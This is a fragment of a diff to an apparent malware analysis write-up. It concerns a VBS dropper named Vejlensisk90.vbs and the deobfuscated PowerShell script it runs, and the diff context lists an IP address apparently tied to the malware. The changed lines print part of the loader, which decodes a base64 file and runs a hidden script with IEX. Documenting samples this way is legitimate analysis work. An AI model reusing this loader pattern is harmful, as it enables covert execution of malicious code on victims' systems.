@@ -17,7 +17,7 @@ C:\Users\Public\info1.pdf
 
 `194.180.48.211`
 
-### Vejlensisk90.vbs executes the following Deobfuscated PS Script
+### Vejlensisk90.vbs executes the following Deobfuscated PS Script which downloads and loads another ps script
 
 ```ps
 Function StringReplace ([String]$Eddikeb){
@@ -51,7 +51,7 @@ if ($Model) {
 	IEX $FileData = Get-Content $FileOutPut;
 	IEX $Base64Decoded = [System.Convert]::FromBase64String($FileData);
 	IEX $ByteArray = [System.Text.Encoding]::ASCII.GetString($Base64Decoded);
-	IEX $vbscript=$ByteArray.substring(188264,19335);
-	IEX $vbscript;
+	IEX $psscript=$ByteArray.substring(188264,19335);
+	IEX $psscript;
 }
 ```
